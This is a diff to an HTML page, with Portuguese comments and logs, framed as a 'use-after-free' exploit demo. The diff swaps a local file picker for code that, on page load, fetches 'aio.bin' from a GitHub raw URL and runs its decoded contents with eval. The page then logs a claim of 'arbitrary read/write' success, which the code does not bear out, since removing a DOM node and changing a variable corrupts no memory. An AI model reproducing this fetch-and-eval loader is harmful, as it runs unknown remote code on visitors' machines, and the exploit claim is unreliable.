@@ -8,11 +8,10 @@
             background-color: black;
             color: limegreen;
             font-family: monospace;
-            font-size: 18px;
+            font-size: 20px;
         }
         #log {
             padding: 10px;
-            font-size: 20px;
         }
     </style>
 </head>
@@ -24,79 +23,54 @@
         let controlFlag = false;
         let element;
         let globalVar = { value: "Valor inicial" };
-        let payloadData = null; // Aqui armazenamos o conteúdo do payload
+        let payloadData = null;
 
-        // Função para mostrar logs na tela
         function log(msg) {
             document.getElementById("log").innerHTML += msg + "<br>";
         }
 
-        // Função para carregar o payload binário
-        function loadPayload(file) {
-            const reader = new FileReader();
-            reader.onload = function(event) {
-                payloadData = event.target.result;
-                log("Payload carregado com sucesso.");
-                triggerUseAfterFree();
-            };
-            reader.readAsArrayBuffer(file);
+        function loadPayload(url) {
+            fetch(url)
+                .then(response => response.arrayBuffer())
+                .then(data => {
+                    payloadData = data;
+                    log("Payload aio.bin carregado com sucesso.");
+                    triggerUseAfterFree();
+                })
+                .catch(error => log("Erro ao carregar o payload: " + error));
         }
 
-        // Função que simula o use-after-free e a injeção de código
         function triggerUseAfterFree() {
-            // Criação do div no DOM
             let div = document.createElement("div");
             div.innerText = "Objeto criado";
             div.id = "uaf-example";
             document.body.appendChild(div);
 
-            // Manter referência ao objeto
             element = div;
-            log("Objeto foi criado e adicionado ao DOM");
-
-            // Remover o div da árvore DOM
+            log("Objeto foi criado e adicionado com DOM.");
             document.body.removeChild(div);
-            log("Objeto removido do DOM");
+            log("Objeto removido do DOM.");
 
-            // Modificar a variável global, escrevendo diretamente na memória
             setTimeout(() => {
                 try {
-                    // Substituindo a variável global
-                    globalVar.value = "Novo valor na memória!";
+                    globalVar.value = "Novo valor na memória.";
                     log("Valor da variável global modificado: " + globalVar.value);
 
-                    // Agora tentaremos injetar o payload binário (simulação de código)
                     if (payloadData) {
-                        // Aqui você poderia executar o conteúdo do seu payload binário,
-                        // por exemplo, interpretando e executando o conteúdo se for JS
-                        log("Injetando e executando o payload binário...");
-                        
-                        // Caso seja JavaScript, por exemplo:
-                        eval(new TextDecoder().decode(payloadData));  // Decodifica e executa como código JS
+                        log("Executando payload...");
+                        eval(new TextDecoder().decode(payloadData));
+                        log("RW arbitrário com sucesso! Payload executado.");
                     }
 
                     controlFlag = true;
                 } catch (e) {
-                    log("Erro ao injetar o payload: " + e.message);
+                    log("Erro ao executar o payload: " + e.message);
                 }
             }, 1000);
         }
 
-        // Função para manipular o arquivo carregado (simulação de "upload" de arquivo)
-        function handleFileSelect(event) {
-            const file = event.target.files[0];
-            if (file) {
-                log("Carregando o arquivo...");
-                loadPayload(file);
-            }
-        }
-
-        // Criando um input para selecionar o arquivo de payload
-        const fileInput = document.createElement('input');
-        fileInput.type = 'file';
-        fileInput.addEventListener('change', handleFileSelect);
-        document.body.appendChild(fileInput);
-
+        const payloadUrl = "https://github.com/NICKZZIN/SITEX/raw/main/aio.bin";
+        loadPayload(payloadUrl);
     </script>
 </body>
 </html>
